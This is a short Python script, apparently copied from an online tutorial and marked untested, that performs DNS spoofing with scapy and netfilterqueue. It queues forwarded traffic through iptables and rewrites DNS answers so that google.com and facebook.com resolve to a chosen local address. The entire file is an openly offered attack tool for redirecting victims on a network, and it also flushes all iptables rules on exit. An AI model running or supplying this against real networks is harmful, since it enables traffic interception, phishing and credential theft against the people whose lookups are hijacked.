#create DNS Spoofing application using the netfilterqueue library

#untested taken from https://www.thepythoncode.com/article/make-dns-spoof-python

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

dns_hosts = {
    b"www.google.com.": "192.168.1.83",
    b"facebook.com.": "192.168.1.83"
}
QUEUE_NUM = 0

###called when the netfilterqueue library receives a packet
def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        packet.set_payload(str(scapy_packet))
    #accept the packet
    packet.accept()

def modify_packet(packet):
    #modifies packet to spoof the DNS response
    #changes are based off the DNS dictionary

    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        return packet
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    packet[DNS].ancount = 1

    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum

    return packet


if __name__ == "__main__":
    #add IPtables rule to forward all DNS requests to the queue
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    #create a queue
    queue = NetfilterQueue()
    try:
        #bind the queue to the NFQUEUE hook
        queue.bind(0, process_packet)
        #start the queue
        queue.run()
    except KeyboardInterrupt:
        #remove the IPtables rule
        os.system("iptables --flush")
        #unbind the queue
        queue.unbind()
        print("[+] Shutting down...")
        print("[+] Exiting...")
        exit()
    except Exception as e:
        print("[-] Error occurred...")
        print(e)
        #remove the IPtables rule
        os.system("iptables --flush")
        #unbind the queue
        queue.unbind()
        print("[+] Shutting down...")
        print("[+] Exiting...")
        exit()